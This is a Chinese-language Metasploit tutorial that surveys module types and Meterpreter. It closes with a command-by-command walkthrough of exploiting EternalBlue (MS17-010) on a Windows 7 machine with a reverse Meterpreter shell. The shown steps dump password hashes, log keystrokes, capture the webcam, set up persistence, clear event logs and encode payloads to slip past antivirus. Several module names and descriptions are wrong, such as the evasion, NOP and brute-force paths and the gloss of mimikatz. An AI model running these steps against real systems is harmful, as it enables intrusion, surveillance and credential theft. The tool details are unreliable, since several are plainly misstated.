# 模块介绍

### **Exploit 模块**:

- 用于执行漏洞利用代码。每个 exploit 模块对应一个已知的漏洞，通过攻击目标系统来尝试获取控制权。
- 例如，`exploit/windows/smb/ms17_010_eternalblue` 用于利用 Windows SMB 漏洞。

### **Payload 模块**:

- Payload 是在利用成功后在目标系统上执行的代码。Metasploit 支持多种类型的 payload，如反向 shell、Meterpreter 会话等。
- 例如，`payload/windows/meterpreter/reverse_tcp` 用于创建一个反向 Meterpreter 会话。

### **Auxiliary 模块**:

- 辅助模块用于执行各种安全测试任务，而不直接进行漏洞利用。包括扫描、嗅探、密码破解等。
- 例如，`auxiliary/scanner/portscan/tcp` 用于执行 TCP 端口扫描。

### **Post 模块**:

- 后渗透模块用于在目标系统被攻破后执行各种操作，如数据提取、权限提升、持久化等。
- 例如，`post/windows/gather/credentials/windows_login` 用于提取 Windows 登录凭证。

### **Encoders 模块**:

- 编码模块用于对 payload 进行编码，以绕过防病毒软件或其他安全防护措施。
- 例如，`encoder/x86/shikata_ga_nai` 是一种常见的编码器，用于对 payload 进行编码。

### **Nops 模块**:

- NOPs（No Operation Sleds）模块提供了用于构建 NOP sled 的代码块，这在构造利用代码时非常有用。
- 例如，`nop/x86/long_jump` 提供了长跳跃 NOP sled。

### **Evasion 模块**:

- 避免检测模块用于绕过安全产品的检测，如防病毒软件、入侵检测系统等。
- 例如，`evasion/x86/shikata_ga_nai` 提供了特定的避检测技术。



# **Exploit 模块概述**

**Exploit 模块**是专门设计来利用特定漏洞的代码。这些模块可以攻击目标系统的操作系统、应用程序、服务等，通过触发漏洞来获取对目标系统的控制或执行其他恶意操作。每个 Exploit 模块通常针对一个或多个已知的安全漏洞。

### 2. **Exploit 模块的组成部分**

每个 Exploit 模块包含多个关键部分：

- **漏洞描述**： Exploit 模块通常会描述其利用的漏洞，包括漏洞的来源、影响范围和技术细节。
- **目标（Targets）**： Exploit 模块通常支持多种目标配置，允许用户选择不同的目标平台或版本。
- **选项（Options）**： Exploit 模块需要一些配置选项来指定攻击细节，如目标主机、端口、负载类型等。
- **负载（Payloads）**： Exploit 模块通常与 Payload 模块配合使用。Payload 是在成功利用漏洞后执行的代码，它定义了攻击成功后的行为。
- **效果（Effects）**： Exploit 模块可能会包括一些效果，比如在目标系统上写入文件、创建反向连接等。

### 3. **使用 Exploit 模块的步骤**

1. **选择 Exploit 模块**： 使用 `use` 命令选择一个 Exploit 模块。例如，要使用 `ms17_010_eternalblue` 模块：

   ```
   msf > use exploit/windows/smb/ms17_010_eternalblue
   ```
   
2. **查看模块信息**： 使用 `info` 命令查看 Exploit 模块的详细信息，包括其用途、选项和目标：

   ```
   msf exploit(ms17_010_eternalblue) > info
   ```
   
3. **配置模块选项**： 根据目标环境设置模块的选项。常见选项包括 `RHOSTS`（目标主机）、`LHOST`（攻击者主机）、`PAYLOAD`（负载类型）等：

   ```
   msf exploit(ms17_010_eternalblue) > set RHOSTS [target IP]
   msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   msf exploit(ms17_010_eternalblue) > set LHOST [your IP]
   ```

4. **运行 Exploit**： 使用 `run` 或 `exploit` 命令启动攻击：

   ```
   msf exploit(ms17_010_eternalblue) > exploit
   ```
   
5. **监控结果**： 观察 Metasploit 控制台的输出，检查是否成功利用了漏洞。如果攻击成功，将会获得一个 Meterpreter 会话或其他形式的访问。

### 4. **Exploit 模块的分类**

- **远程利用（Remote Exploits）**：这些模块用于攻击远程系统上的漏洞，例如网络服务、Web 应用程序等。
- **本地利用（Local Exploits）**：这些模块用于攻击已经在本地系统上的漏洞，通常涉及权限提升等操作。
- **网络利用（Network Exploits）**：这些模块针对网络协议中的漏洞进行攻击，如 SMB、HTTP、FTP 等。
- **Web 应用利用（Web Application Exploits）**：这些模块用于攻击 Web 应用程序中的漏洞，例如 SQL 注入、跨站脚本（XSS）等。

### 5. **编写和定制 Exploit 模块**

如果需要编写或定制 Exploit 模块，通常包括以下步骤：

- **编写模块代码**：使用 Ruby 编程语言编写 Metasploit 模块。Metasploit 模块通常位于 `/usr/share/metasploit-framework/modules/exploits/` 目录中。
- **定义漏洞**：描述漏洞的影响、攻击方式等。
- **设置目标**：定义支持的操作系统、应用程序版本等。
- **编写利用代码**：实现利用漏洞的代码。
- **测试模块**：在受控环境中测试模块以确保其有效性。

# **Payload 模块概述**

Payload 模块是攻击链中的核心组成部分，它在 Exploit 模块成功利用漏洞后执行。Payload 模块的功能可以从简单的命令行访问到复杂的远程控制和信息收集等。

### 2. **Payload 模块的类型**

Payload 模块通常分为几类，每类模块根据其功能和执行方式有所不同：

#### 2.1. **反向连接（Reverse）**

- **反向 Shell**：执行一个反向连接的 Shell 会话。目标机器通过反向连接将一个 Shell 会话连接到攻击者的主机上。
  - 例如，`windows/meterpreter/reverse_tcp` 是一个常见的反向 Meterpreter 会话负载。
- **反向 Meterpreter**：提供一个功能强大的 Meterpreter 会话，通过反向连接将会话发送到攻击者的主机上。
  - 例如，`windows/x64/meterpreter/reverse_tcp`。

#### 2.2. **绑定连接（Bind）**

- **绑定 Shell**：在目标机器上创建一个绑定的 Shell 会话，攻击者可以通过网络连接到目标机器上。
  - 例如，`windows/meterpreter/bind_tcp` 会在目标机器上启动一个监听端口，等待攻击者的连接。
- **绑定 Meterpreter**：在目标机器上创建一个绑定的 Meterpreter 会话，攻击者可以通过连接到目标机器上的指定端口来获得会话。
  - 例如，`windows/x64/meterpreter/bind_tcp`。

#### 2.3. **单一用途（Single-Use）**

- **Command Execution**：执行一个特定的命令并退出。这类 Payload 只运行一次，并在执行完成后退出。
  - 例如，`cmd/unix/reverse` 执行一个反向 Shell 并在执行后退出。
- **Scripting**：执行一个指定的脚本。
  - 例如，`cmd/windows/powershell_reverse_tcp` 执行一个 PowerShell 脚本并将结果发送回攻击者。

#### 2.4. **其他类型**

- **VNC**：提供对目标机器的图形化访问。
  - 例如，`windows/vncinject/reverse_tcp` 提供一个 VNC 会话。
- **Meterpreter**：一个强大的 Payload，它提供了一个全面的攻击框架，包括文件系统访问、网络流量监控、密码抓取等功能。
  - 例如，`windows/x64/meterpreter/reverse_https` 提供一个反向 HTTPS Meterpreter 会话。

### 3. **配置 Payload 模块**

配置 Payload 模块通常包括以下步骤：

1. **选择 Payload**： 使用 `use` 命令选择一个 Payload 模块：

   ```
   msf > use payload/windows/meterpreter/reverse_tcp
   ```
   
2. **设置 Payload 选项**： 设置 Payload 的参数，例如目标主机和端口：

   ```
   msf payload(meterpreter/reverse_tcp) > set LHOST [your IP]
   msf payload(meterpreter/reverse_tcp) > set LPORT [port number]
   ```

   - `LHOST`：攻击者主机的 IP 地址，用于接收连接。
   - `LPORT`：攻击者主机的监听端口。

3. **验证设置**： 使用 `show options` 命令检查配置是否正确：

   ```
   msf payload(meterpreter/reverse_tcp) > show options
   ```
   
4. **生成 Payload**： 在 Exploit 模块配置完成后，Payload 会自动作为 Exploit 模块的一部分被加载和执行。

### 4. **使用 Payload 模块的步骤**

1. **选择 Exploit 模块**：选择一个针对目标系统的 Exploit 模块。

   ```
   msf > use exploit/windows/smb/ms17_010_eternalblue
   ```
   
2. **选择 Payload 模块**：选择一个与 Exploit 模块兼容的 Payload 模块。

   ```
   msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```
   
3. **设置 Payload 参数**：

   ```
   msf exploit(ms17_010_eternalblue) > set LHOST [your IP]
   msf exploit(ms17_010_eternalblue) > set LPORT [port number]
   ```

4. **执行 Exploit**：

   ```
   msf exploit(ms17_010_eternalblue) > exploit
   ```

### 5. **编写和定制 Payload**

如果需要编写或定制 Payload 模块，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。
- **实现 Payload 行为**：定义 Payload 的具体操作，例如文件下载、命令执行等。
- **测试和调试**：在测试环境中进行调试和验证。

# **Auxiliary 模块概述**

Auxiliary 模块提供了许多额外的功能，帮助安全测试人员和研究人员进行各种网络和系统测试。它们通常用于信息收集、扫描和测试，而不是直接进行漏洞利用。

### 2. **Auxiliary 模块的分类**

Auxiliary 模块可以分为以下几类：

#### 2.1. **扫描（Scanner）**

- **端口扫描**：检测目标主机上开放的端口。
  - 例如，`auxiliary/scanner/portscan/tcp` 用于进行 TCP 端口扫描。
- **服务扫描**：识别目标主机上运行的服务和版本。
  - 例如，`auxiliary/scanner/http/http_version` 用于检测 Web 服务器的版本。
- **漏洞扫描**：检查目标系统是否存在已知的漏洞。
  - 例如，`auxiliary/scanner/smb/smb_version` 用于检查 SMB 协议的版本。
  
  **扫描安卓**use auxiliary/scanner/android/adb_enum

#### 2.2. **嗅探（Sniffer）**

- 网络嗅探

  ：捕获网络流量，分析传输的数据包。

  - 例如，`auxiliary/sniffer/http` 可以捕获 HTTP 流量。

#### 2.3. **密码破解（Brute Force）**

- **密码破解**：尝试破解目标系统的密码，通过穷举或字典攻击。
  - 例如，`auxiliary/brute_force/ssh_login` 用于对 SSH 登录进行密码破解。
- **字典攻击**：使用词典文件尝试密码组合。
  - 例如，`auxiliary/brute_force/ftp_login` 用于对 FTP 登录进行字典攻击。

#### 2.4. **信息收集（Gather）**

- 信息收集

  ：收集目标系统的信息，如操作系统版本、用户信息等。

  - 例如，`auxiliary/gather/enum_users` 用于枚举目标系统上的用户。

#### 2.5. **拒绝服务（DoS）**

- 拒绝服务攻击

  ：测试目标系统对拒绝服务攻击的响应。

  - 例如，`auxiliary/dos/windows/smb/ms08_067_netapi` 用于测试 SMB 漏洞的 DoS 攻击。

### 3. **使用 Auxiliary 模块的步骤**

1. **选择 Auxiliary 模块**： 使用 `use` 命令选择一个 Auxiliary 模块。例如，要使用端口扫描模块：

   ```
   msf > use auxiliary/scanner/portscan/tcp
   ```
   
2. **查看模块信息**： 使用 `info` 命令查看模块的详细信息，包括功能、选项和目标：

   ```
   msf auxiliary(portscan/tcp) > info
   ```
   
3. **配置模块选项**： 根据目标环境设置模块的选项。例如，设置扫描的目标主机和端口范围：

   ```
   msf auxiliary(portscan/tcp) > set RHOSTS [target IP]
   msf auxiliary(portscan/tcp) > set PORTS [port range]
   ```

4. **运行模块**： 使用 `run` 命令启动模块执行：

   ```
   msf auxiliary(portscan/tcp) > run
   ```
   
5. **查看结果**： 查看模块的输出结果，分析测试数据。

### 4. **Auxiliary 模块的功能和选项**

每个 Auxiliary 模块都有特定的功能和配置选项。一般来说，常见的选项包括：

- **RHOSTS**：目标主机的 IP 地址或地址范围。
- **PORTS**：要扫描的端口或端口范围。
- **THREADS**：并发线程数，用于控制扫描的速度。
- **PASSWORD**：密码（对于密码破解模块）。
- **USERNAME**：用户名（对于密码破解模块）。

### 5. **编写和定制 Auxiliary 模块**

如果需要编写或定制 Auxiliary 模块，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。Auxiliary 模块代码通常位于 `/usr/share/metasploit-framework/modules/auxiliary/` 目录中。
- **定义模块功能**：编写模块时，需要实现功能逻辑、设置选项和处理结果。
- **测试和调试**：在测试环境中验证模块的有效性和稳定性。

# **Post 模块概述**

Post 模块主要用于执行攻击后的操作。这些操作通常包括数据收集、系统控制、权限提升等任务。Post 模块是在成功获得访问权限（如通过 Exploit 模块获得的 Meterpreter 会话）后使用的，用于进行进一步的系统渗透和信息收集。

### 2. **Post 模块的分类**

Post 模块可以分为几类，每类模块根据其功能和操作方式有所不同：

#### 2.1. **信息收集（Gather）**

- **系统信息**：收集目标系统的基本信息，如操作系统版本、用户列表、安装的软件等。
  - 例如，`post/windows/gather/enum_users` 用于枚举目标系统上的用户账户。
- **网络信息**：收集目标系统的网络配置信息，如网络适配器、活动连接等。
  - 例如，`post/windows/gather/enum_network` 用于收集网络适配器信息。
- **凭据收集**：提取存储在目标系统中的密码哈希或其他敏感信息。
  - 例如，`post/windows/gather/credentials/enum_shares` 用于枚举共享资源。

#### 2.2. **权限提升（Elevate）**

- 提升权限

  ：尝试通过各种方法提升当前会话的权限，从普通用户权限提升到管理员或系统权限。

  - 例如，`post/windows/escalate/ask` 尝试通过 UAC 绕过和权限提升的方法。

#### 2.3. **持久化（Persistence）**

- 持久化

  ：在目标系统上设置持久化机制，确保在系统重启或用户登出后仍能保持访问权限。

  - 例如，`post/windows/manage/enable_rdp` 用于启用远程桌面协议（RDP），以便在系统重启后可以远程访问。

#### 2.4. **清理（Cleanup）**

- 清理痕迹

  ：删除或修改目标系统中的日志文件、痕迹或其他可能揭示攻击活动的证据。

  - 例如，`post/windows/manage/clear_event_logs` 用于清除 Windows 事件日志。

### 3. **使用 Post 模块的步骤**

1. **获得 Meterpreter 会话**：在使用 Post 模块之前，你需要一个有效的 Meterpreter 会话。你可以通过 Exploit 模块获得此会话。

2. **选择 Post 模块**： 使用 `use` 命令选择一个 Post 模块。例如，要使用信息收集模块：

   ```
   msf > use post/windows/gather/enum_users
   ```
   
3. **查看模块信息**： 使用 `info` 命令查看模块的详细信息，包括功能和选项：

   ```
   msf post(enum_users) > info
   ```
   
4. **设置模块选项**： 根据需要设置模块的选项。例如，设置目标会话 ID：

   ```
   msf post(enum_users) > set SESSION [session ID]
   ```
   
5. **运行模块**： 使用 `run` 命令启动模块执行：

   ```
   msf post(enum_users) > run
   ```
   
6. **查看结果**： 查看模块的输出结果，分析收集到的信息。

### 4. **Post 模块的功能和选项**

每个 Post 模块都有特定的功能和配置选项。常见选项包括：

- **SESSION**：指定 Meterpreter 会话的 ID。
- **LHOST**：用于通信的攻击者主机 IP（对于某些模块）。
- **LPORT**：用于通信的端口（对于某些模块）。
- **TARGET**：指定目标系统的详细信息（对于某些模块）。

### 5. **编写和定制 Post 模块**

如果需要编写或定制 Post 模块，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。Post 模块代码通常位于 `/usr/share/metasploit-framework/modules/post/` 目录中。
- **定义模块功能**：编写模块时，需要实现功能逻辑、设置选项和处理结果。
- **测试和调试**：在测试环境中验证模块的有效性和稳定性。

#  **Encoders 模块概述**

Encoders 模块的主要作用是对 Payload 进行编码，改变其二进制表示，使其不易被安全软件检测到。编码的过程不会改变 Payload 的实际功能，但通过修改其字节序列，使其更难被识别为已知的恶意模式。

### 2. **Encoders 模块的类型**

Encoders 模块有多种类型，主要包括以下几类：

#### 2.1. **字节编码（Byte Encoding）**

- 转换编码

  ：将 Payload 的字节流转换为不同的格式。

  - 例如，`x86/shikata_ga_nai` 是一个流行的字节编码器，它将字节流转换为多个变体，使其更加难以被防病毒软件检测。

#### 2.2. **字符串编码（String Encoding）**

- 字符替换

  ：将 Payload 中的字符串或命令进行编码，以避开字符串检测。

  - 例如，`x86/jmp_call_additive` 使用跳转和调用指令来掩盖 Payload 的实际代码。

#### 2.3. **加密编码（Encryption Encoding）**

- 加密 Payload

  ：使用加密算法对 Payload 进行加密，确保 Payload 的有效负载在传输过程中是安全的。

  - 例如，`x86/alpha_mixed` 使用混合的加密技术来隐藏 Payload 的实际内容。

### 3. **使用 Encoders 模块的步骤**

1. **选择 Encoders 模块**： 选择一个合适的 Encoder 模块。例如，要使用 `shikata_ga_nai` 编码器：

   ```
   msf > use encoder/x86/shikata_ga_nai
   ```
   
2. **查看模块信息**： 使用 `info` 命令查看编码器的详细信息，包括功能和选项：

   ```
   msf encoder(shikata_ga_nai) > info
   ```
   
3. **设置编码器选项**： 配置编码器的选项，如编码次数等：

   ```
   msf encoder(shikata_ga_nai) > set ENCODING [encoding options]
   ```
   
4. **选择 Payload 模块**： 选择一个需要编码的 Payload 模块：

   ```
   msf > use payload/windows/meterpreter/reverse_tcp
   ```
   
5. **配置 Payload 模块**： 配置 Payload 的选项，如目标主机和监听端口：

   ```
   msf payload(meterpreter/reverse_tcp) > set LHOST [your IP]
   msf payload(meterpreter/reverse_tcp) > set LPORT [port number]
   ```

6. **生成编码的 Payload**： 使用 `generate` 命令生成编码的 Payload：

   ```
   msf payload(meterpreter/reverse_tcp) > generate -t exe -e x86/shikata_ga_nai -i 5 -f /path/to/output.exe
   ```
   
   其中，`-e` 参数指定了使用的编码器，`-i` 参数指定编码的次数，`-f` 参数指定生成的文件路径。

### 4. **编码器的常见选项**

每个编码器模块可能具有不同的选项，以下是一些常见的选项：

- **`-e`**：指定使用的编码器。
- **`-i`**：指定编码的次数，即对 Payload 进行多少次编码。
- **`-f`**：指定输出文件的路径。

### 5. **选择合适的编码器**

不同的编码器有不同的特点，选择合适的编码器可以提高 Payload 的隐蔽性。以下是一些常用的编码器及其特点：

- **`x86/shikata_ga_nai`**：一个多态编码器，可以生成多种不同的编码变体，适合用于绕过防病毒软件。
- **`x86/alpha_mixed`**：一个将 ASCII 和二进制数据混合的编码器，用于隐藏 Payload 的真实内容。
- **`x86/countdown`**：一个将 Payload 数据分段并用倒计时的方式传输的编码器，有助于绕过某些防御机制。

### 6. **编写和定制编码器**

如果需要编写或定制编码器，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。编码器代码通常位于 `/usr/share/metasploit-framework/modules/encoders/` 目录中。
- **定义编码逻辑**：编写编码器时，需要实现编码算法和逻辑。
- **测试和调试**：在测试环境中验证编码器的有效性和稳定性。

# **Nops 模块概述**

NOPs 模块生成 NOPs 指令，主要用于在缓冲区溢出攻击或其他漏洞利用中作为填充。使用 NOPs 可以确保攻击代码（Payload）的执行正确性，尤其是在内存中放置 Payload 时，NOPs 可以帮助 Payload 在执行时不容易被意外破坏。

### 2. **Nops 模块的功能**

- **缓冲区填充**：在缓冲区溢出攻击中，用 NOPs 填充攻击载荷的前后区域，确保攻击代码可以正确执行。
- **对齐**：在某些情况下，NOPs 用于对齐代码，使其适合在特定的内存地址执行。
- **简化攻击**：使用 NOPs 可以简化攻击过程，因为它们可以缓解因为偏移量不精确或其他小错误导致的攻击失败。

### 3. **Nops 模块的常见编码**

常用的 NOPs 编码方式包括：

- **`0x90`**：在 x86 架构中，`0x90` 是最常用的 NOP 指令。它代表 No Operation，不对 CPU 状态做任何改变。
- **`0x66 0x90`**：在一些情况下，`0x66 0x90` 也可以用于编码 NOPs，尤其是在需要特定对齐的情况中。

### 4. **使用 Nops 模块的步骤**

1. **选择 Nops 模块**： 使用 `use` 命令选择一个 Nops 模块。例如，选择 `x86` NOP 编码模块：

   ```
   msf > use encoder/x86/none
   ```
   
2. **查看模块信息**： 使用 `info` 命令查看 Nops 模块的详细信息：

   ```
   msf encoder/none > info
   ```
   
3. **配置 Nops 模块**： 根据需要设置 Nops 模块的选项。例如，设置生成的 NOPs 数量：

   ```
   msf encoder/none > set NOPLEN [number of NOPs]
   ```
   
4. **生成 NOPs**： 生成 NOPs 填充。例如，生成指定数量的 NOPs：

   ```
   msf encoder/none > run
   ```

### 5. **Nops 模块的选项**

每个 Nops 模块可能具有不同的选项。常见选项包括：

- **`NOPLEN`**：指定生成的 NOPs 数量。
- **`NOP`**：指定使用的 NOP 指令字节（通常是 `0x90`）。
- **`TARGET`**：指定目标架构（如 `x86` 或 `x64`）。

### 6. **编写和定制 Nops 模块**

如果需要编写或定制 Nops 模块，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。Nops 模块代码通常位于 `/usr/share/metasploit-framework/modules/encoders/` 目录中。
- **定义 NOP 生成逻辑**：编写 Nops 模块时，需要定义生成 NOPs 的逻辑和算法。
- **测试和调试**：在测试环境中验证模块的有效性和稳定性。

# **Evasion 模块概述**

Evasion 模块的作用是对攻击载荷进行各种技术处理，以避开或减少被安全防御软件检测的可能性。这些技术可以包括编码、加密、混淆等，使攻击载荷在经过网络或存储后仍能有效执行。

### 2. **Evasion 模块的功能**

Evasion 模块主要提供以下功能：

- **编码和加密**：对 Payload 进行编码或加密，使其在传输过程中不被检测系统识别。
- **混淆和修改**：对 Payload 的结构或内容进行修改，改变其特征，避开检测系统的签名或规则。
- **动态生成**：动态生成 Payload，减少静态检测的可能性。
- **多态性**：生成具有不同特征的多种变体，以增加绕过防御系统的成功率。

### 3. **Evasion 模块的类型**

Evasion 模块可以包括以下几种类型：

#### 3.1. **编码（Encoding）**

- 多态编码

  ：生成不同变体的 Payload，通过编码和混淆技术减少被检测的可能性。

  - 例如，`encoder/x86/shikata_ga_nai` 是一个常用的多态编码器。

#### 3.2. **加密（Encryption）**

- Payload 加密

  ：对 Payload 使用加密技术，确保其在传输过程中不被检测系统识别。

  - 例如，`encoder/x86/alpha_mixed` 使用加密技术来隐藏 Payload 的真实内容。

#### 3.3. **混淆（Obfuscation）**

- 指令混淆

  ：修改 Payload 的指令集或代码结构，使其难以被静态分析和检测系统识别。

  - 例如，`evasion/x86/obsfucate` 可能会对 Payload 进行指令混淆。

#### 3.4. **动态生成（Dynamic Generation）**

- 动态 Payload 生成

  ：根据运行时环境动态生成 Payload，以降低静态检测的成功率。

  - 例如，某些 evasion 模块可以动态生成不同的代码变体。

### 4. **使用 Evasion 模块的步骤**

1. **选择 Evasion 模块**： 使用 `use` 命令选择一个 Evasion 模块。例如，要使用一个编码模块：

   ```
   msf > use encoder/x86/shikata_ga_nai
   ```
   
2. **查看模块信息**： 使用 `info` 命令查看 Evasion 模块的详细信息，包括功能和选项：

   ```
   msf encoder/shikata_ga_nai > info
   ```
   
3. **配置 Evasion 模块**： 根据需要配置模块选项，例如设置编码次数：

   ```
   msf encoder/shikata_ga_nai > set ENCODING [encoding options]
   ```
   
4. **选择 Payload 模块**： 选择需要编码或加密的 Payload 模块：

   ```
   msf > use payload/windows/meterpreter/reverse_tcp
   ```
   
5. **配置 Payload 模块**： 配置 Payload 的选项，例如目标主机和监听端口：

   ```
   msf payload(meterpreter/reverse_tcp) > set LHOST [your IP]
   msf payload(meterpreter/reverse_tcp) > set LPORT [port number]
   ```

6. **生成 Evasion Payload**： 生成经过编码或加密的 Payload：

   ```
   msf payload(meterpreter/reverse_tcp) > generate -e x86/shikata_ga_nai -i 5 -f /path/to/output.exe
   ```
   
   其中，`-e` 参数指定了使用的编码器，`-i` 参数指定编码的次数，`-f` 参数指定生成的文件路径。

### 5. **Evasion 模块的常见选项**

每个 Evasion 模块可能具有不同的选项。常见选项包括：

- **`-e`**：指定使用的编码器或加密技术。
- **`-i`**：指定编码或加密的次数。
- **`-f`**：指定输出文件的路径。
- **`TARGET`**：指定目标架构或环境（如 `x86`、`x64`）。

### 6. **编写和定制 Evasion 模块**

如果需要编写或定制 Evasion 模块，可以：

- **使用 Ruby 编程语言**：Metasploit 模块通常使用 Ruby 编写。Evasion 模块代码通常位于 `/usr/share/metasploit-framework/modules/evasion/` 目录中。
- **定义编码和混淆逻辑**：编写 Evasion 模块时，需要定义编码、加密或混淆的逻辑。
- **测试和调试**：在测试环境中验证模块的有效性和稳定性。



# **Meterpreter 概述**

Meterpreter 是 Metasploit Framework 中的一个动态 Payload，它与传统的反向 Shell 或其他 Payload 不同，因为它提供了丰富的功能，并且在目标系统上运行时具有高度的隐蔽性和可扩展性。Meterpreter 允许攻击者在目标系统上执行命令、加载额外的扩展模块、进行系统信息收集、文件操作等。

### 2. **Meterpreter 的主要功能**

#### 2.1. **交互式会话**

- **命令执行**：可以在目标系统上执行各种命令，类似于传统的 Shell。
  - 例如：`sysinfo`、`getuid`、`ps`、`shell` 等命令。
- **文件操作**：可以上传、下载、删除或列出目标系统上的文件。
  - 例如：`upload`、`download`、`ls`、`rm` 等命令。

#### 2.2. **系统信息收集**

- **系统信息**：收集有关目标系统的信息，如操作系统版本、主机名、网络配置等。
  - 例如：`sysinfo` 命令提供系统的详细信息。
- **用户信息**：收集系统上的用户信息，包括当前登录用户、用户列表等。
  - 例如：`getuid`、`enum_users`。

#### 2.3. **网络和进程管理**

- **网络操作**：列出网络接口、网络连接、配置网络设置等。
  - 例如：`ifconfig`、`netstat`。
- **进程管理**：列出和管理目标系统上的进程。
  - 例如：`ps`、`kill`。

#### 2.4. **后渗透操作**

- **权限提升**：尝试提升当前会话的权限，从普通用户权限提升到管理员或系统权限。
  - 例如：`getsystem`、`elevate`。
- **持久化**：在目标系统上设置持久化机制，确保在系统重启或用户登出后仍能保持访问权限。
  - 例如：`run persistence`。
- **键盘记录和截屏**：记录用户的键盘输入或捕获目标系统的屏幕截图。
  - 例如：`keyscan_start`、`screenshot`。

#### 2.5. **模块扩展**

- 扩展模块

  ：加载和执行 Metasploit Framework 中的扩展模块，以增加 Meterpreter 的功能。

  - 例如：`load` 命令可以加载各种扩展。

### 3. **Meterpreter 的工作原理**

Meterpreter 通过建立一个加密的反向连接（通常是 TCP）来与攻击者的主机进行通信。它在目标系统上以最小的痕迹运行，避免被杀毒软件或入侵检测系统检测。Meterpreter 通过以下几个步骤进行操作：

1. **生成和注入**：利用 Metasploit 中的 Exploit 模块生成一个 Meterpreter Payload，并注入到目标系统。
2. **建立会话**：Meterpreter Payload 在目标系统上执行，建立一个加密的连接回攻击者主机，提供一个交互式的 Meterpreter 会话。
3. **执行命令**：攻击者通过 Meterpreter 会话执行各种命令和操作，进行后渗透测试和数据收集。

### 4. **常用 Meterpreter 命令**

以下是一些常用的 Meterpreter 命令：

- **`sysinfo`**：显示目标系统的信息。
- **`getuid`**：显示当前用户 ID。
- **`ps`**：列出目标系统上的进程。
- **`shell`**：启动一个系统 Shell。
- **`upload`**：上传文件到目标系统。
- **`download`**：从目标系统下载文件。
- **`keyscan_start`**：启动键盘记录器。
- **`screenshot`**：捕获目标系统的屏幕截图。
- **`run persistence`**：设置持久化机制。
- webcam_list :列出摄像头
- webcam_snap：拍照
- webcam_stream：开视频
- run vnc：查看屏幕
- execute：执行文件
- mimikatz：改密码

### 5. **Meterpreter 扩展**

Meterpreter 支持各种扩展模块，可以通过 `load` 命令加载：

- **`load stdapi`**：加载标准 API 扩展。
- **`load priv`**：加载权限提升扩展。



# 步骤

### 1. 启动 Metasploit

1. 打开终端

   ，启动 Metasploit 控制台：

   ```
   msfconsole
   ```

### 初始化数据库

如果是第一次使用 Metasploit，或者数据库没有正确初始化，你需要手动启动和初始化数据库。以下是步骤：

1. **启动 PostgreSQL 数据库服务**： 在 Kali Linux 中，通常 PostgreSQL 服务是预安装的。你可以使用以下命令启动 PostgreSQL 服务：

   ```
   sudo service postgresql start
   ```

2. **初始化数据库**： Metasploit 提供了一个工具来初始化数据库。这通常在安装 Metasploit 时自动完成，但如果需要，你可以手动执行：

   ```
   msfdb init
   ```

   这个命令会做以下几件事：

   - 启动 PostgreSQL 服务（如果尚未启动）。
   - 创建 Metasploit 所需的数据库和用户。
   - 初始化数据库 schema。

3. **检查数据库连接**： 启动 Metasploit 控制台后，你可以检查数据库连接是否正常：

   ```
   msfconsole
   ```

   进入控制台后，可以运行以下命令检查数据库状态：

   ```
   msf > db_status
   ```

   如果数据库连接正常，你会看到类似于 `[*] postgresql connected to msf_database` 的消息。

### 处理数据库问题

如果在初始化或使用数据库时遇到问题，可以尝试以下操作：

- **重启 PostgreSQL 服务**：

  ```
  sudo service postgresql restart
  ```

- **检查 PostgreSQL 服务状态**：

  ```
  sudo service postgresql status
  ```

- **查看数据库日志**：检查 PostgreSQL 日志文件，以获取有关任何错误的详细信息，通常位于 `/var/log/postgresql/` 目录中。

### 2. 选择并配置漏洞利用模块

1. **搜索永恒之蓝漏洞利用模块**：

   ```
   msf > search ms17_010
   ```

2. **选择利用模块**：

   ```
   msf > use exploit/windows/smb/ms17_010_eternalblue
   ```

3. **设置目标主机**：

   ```
   msf exploit(ms17_010_eternalblue) > set RHOSTS [target IP]
   ```

   替换 `[target IP]` 为 Windows 7 目标机器的 IP 地址。

4. **设置负载**：

   ```
   msf exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   ```

   你可以选择 `windows/x64/meterpreter/reverse_tcp` 或 `windows/meterpreter/reverse_tcp` 取决于目标机器的架构（x64 或 x86）。

5. **设置你的监听 IP 地址**：

   ```
   msf exploit(ms17_010_eternalblue) > set LHOST [your IP]
   ```

   替换 `[your IP]` 为你的 Kali Linux 机器的 IP 地址。

6. **设置监听端口（可选，默认为 4444）**：

   ```
   msf exploit(ms17_010_eternalblue) > set LPORT [port number]
   ```

   替换 `[port number]` 为你希望使用的端口号。如果不设置，默认为 4444。

### 3. 执行漏洞利用

1. **运行利用**：

   ```
   msf exploit(ms17_010_eternalblue) > exploit
   ```

   或者使用 `run` 命令：

   ```
   msf exploit(ms17_010_eternalblue) > run
   ```

2. **等待攻击完成**： 如果成功，你会看到 Metasploit 控制台中出现 Meterpreter 会话的提示。

### 4. 与 Meterpreter 会话交互

1. **查看活动会话**：

   ```
   msf > sessions -l
   ```

2. **与 Meterpreter 会话交互**：

   ```
   msf > sessions -i [session ID]
   ```

   替换 `[session ID]` 为 Meterpreter 会话的 ID。

3. **执行 Meterpreter 命令**： 一旦进入 Meterpreter 会话，你可以执行各种命令，例如：

   - 查看系统信息

     ：

     ```
     meterpreter > sysinfo
     ```

   - 列出文件和目录

     ：

     ```
     meterpreter > ls
     ```

   - 获取命令提示符

     ：

     ```
     meterpreter > shell
     ```

   - 提取敏感信息

     ：

     ```
     meterpreter > hashdump
     ```

### 5. 清理痕迹（可选）

如果你需要清理 Meterpreter 会话中的痕迹，可以使用一些后渗透模块来移除日志或恢复目标机器的安全状态。

### 总结

1. **启动 Metasploit**：使用 `msfconsole` 启动。
2. **选择模块**：使用 `use exploit/windows/smb/ms17_010_eternalblue`。
3. **设置目标和负载**：使用 `set RHOSTS`, `set PAYLOAD`, `set LHOST`。
4. **执行利用**：使用 `exploit` 或 `run`。
5. **与会话交互**：使用 `sessions -i [session ID]`。